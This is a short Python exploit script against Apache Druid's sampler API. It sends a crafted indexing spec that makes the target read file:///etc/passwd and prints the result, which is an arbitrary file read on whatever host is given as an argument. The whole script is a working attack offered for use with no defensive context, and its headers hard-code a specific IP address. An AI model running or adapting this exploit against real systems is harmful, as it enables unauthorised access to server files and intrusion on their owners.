import requests
import sys
import json
#@created by d0rkerdevil
target = sys.argv[1]
if len(sys.argv) >= 1:
    try:
        url = target+"/druid/indexer/v1/sampler?for=connect"
        headerss = {"Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36", "Content-Type": "application/json;charset=UTF-8", "Origin": "http://130.59.118.184:8888", "Referer": "http://130.59.118.184:8888/unified-console.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        post_data = {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":[" file:///etc/passwd "]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string", "parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"no_ such_ column","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
        r = requests.post(url, headers=headerss, json=post_data)
        pretty_json = json.loads(r.text)
        print (json.dumps(pretty_json, indent=2))
    except Exception as error:
        print("something went wrong!!!")
